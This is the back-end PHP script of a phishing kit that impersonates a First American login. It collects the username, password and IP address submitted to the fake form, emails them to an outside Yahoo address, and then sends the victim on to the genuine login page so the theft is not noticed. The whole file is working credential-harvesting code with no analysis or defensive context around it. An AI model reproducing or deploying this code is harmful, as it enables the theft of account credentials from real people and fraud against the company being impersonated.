<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------fristAT-----------------------\n";
$message .= "E-mail:           : ".$_POST['username']."\n";
$message .= "Password:           : ".$_POST['password']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------fristAT-------------\n";
$send = "amandarusty744@yahoo.com";
$subject = "Result from Unknown";
$headers = "From: fristAT<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}




	
		   header("Location: https://www.myfirstam.com/Security/Login?ReturnUrl=%2F");

	 
?>